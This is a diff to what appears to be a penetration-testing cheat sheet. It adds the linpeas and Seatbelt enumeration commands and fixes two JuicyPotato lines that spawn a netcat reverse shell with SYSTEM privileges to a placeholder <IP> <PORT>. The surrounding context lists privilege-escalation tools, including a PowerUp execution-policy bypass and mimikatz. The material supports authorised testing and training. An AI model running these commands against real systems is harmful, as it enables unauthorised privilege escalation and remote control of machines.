@@ -1336,6 +1336,7 @@ proxychains <COMMAND>
 ``` 
 bash LinEnum.sh
 bash lse.sh -l 1
+bash linpeas.sh
 python linuxprivchecker.py
 ./unix-privesc-check standard
 ```
@@ -1393,6 +1394,7 @@ apt update hooking (PreInvoke)
 ```
 winPEAS.exe
 windows-privesc-check2.exe
+Seatbelt.exe -group=all
 powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
 Powerless.bat
 winPEAS.bat
@@ -1426,8 +1428,8 @@ mimikatz.exe
 ```
 If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.
 
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
-JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t *
+JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <IP> <PORT> -e c:\windows\system32\cmd.exe" -t * -c <CLSID>
 
 # CLSID
 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
